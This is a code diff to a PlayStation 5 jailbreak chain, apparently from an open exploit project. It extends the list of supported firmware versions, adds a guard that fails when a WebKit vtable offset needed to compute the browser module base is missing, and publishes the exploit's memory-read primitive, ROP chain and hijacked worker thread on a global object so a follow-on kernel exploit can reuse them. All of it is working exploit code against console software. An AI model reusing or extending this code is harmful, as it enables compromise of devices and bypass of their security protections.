@@ -4,8 +4,11 @@ if (!navigator.userAgent.includes('PlayStation 5')) {
 }
 
 const supportedFirmwares = [
+    "7.00", "7.01", "7.20", "7.40", "7.60", "7.61",
+    "8.00", "8.20", "8.40", "8.60",
     "9.00", "9.05", "9.20", "9.40", "9.60", "10.00", "10.01", "10.20",
-    "10.40", "10.60", "11.00", "11.20", "11.40", "11.60", "12.00"
+    "10.40", "10.60", "11.00", "11.20", "11.40", "11.60", "12.00",
+    "12.02", "12.20", "12.40", "12.60", "12.70"
 ];
 const fw_match = /PlayStation 5\/(\d+\.\d+)/.exec(navigator.userAgent);
 window.fw_str = fw_match ? fw_match[1] : "";
@@ -105,6 +108,16 @@ async function prepare(p) {
                 ? "0x" + globalThis.__ps5NativeCtor.toString(16) : "absent")
             + "-hc=" + (typeof OFFSET_wk_host_constructor_candidates !== "undefined"
                 ? OFFSET_wk_host_constructor_candidates.length : "none"));
+        // A profile without a real rva here must refuse loudly: subtracting 0
+        // yields the raw vtable-entry pointer as if it were the module base,
+        // and every gadget/syscall derived from that base dies with no usable
+        // message.
+        if (typeof OFFSET_wk_vtable_first_element !== "number"
+            || !OFFSET_wk_vtable_first_element) {
+            throw new Error("fw " + window.fw_str + " has no usable "
+                + "OFFSET_wk_vtable_first_element - cannot resolve the WebKit "
+                + "base from the textarea vtable.");
+        }
         libSceNKWebKitBase = p.read8(textAreaVtable).sub32(OFFSET_wk_vtable_first_element);
     }
 
@@ -336,6 +349,27 @@ async function prepare(p) {
         throw new Error("Webkit exploit failed.");
     }
     jbmark("PREP-GETPID-OK", "pid=" + pid.low);
+
+    // Handoff bundle for the p2jb driver (slopkit/p2jb.html): after prepare()
+    // returns, p2jb_poops.js consumes this to run the P2JB kernel exploit on
+    // poopsploit primitives. worker/worker_stack hand over the ALREADY-hijacked
+    // rop_slave worker so rop-worker reuses it instead of spawning a second one.
+    // Publication is passive: poops.html never reads window.POOPS.
+    window.POOPS = {
+        p: p2,
+        chain: chain,
+        int64: int64,
+        toI64: function (x) {
+            if (x && typeof x.low !== "undefined") return x;
+            const b = (typeof x === "bigint") ? x : BigInt(x >>> 0);
+            return new int64(Number(b & 0xffffffffn), Number((b >> 32n) & 0xffffffffn));
+        },
+        log: (typeof log === "function") ? function (m) { log(m); } : function () { },
+        jbmark: jbmark,
+        fw_str: window.fw_str,
+        worker: worker,
+        worker_stack: worker_stack
+    };
 
     return { p: p2, chain: chain };
 }
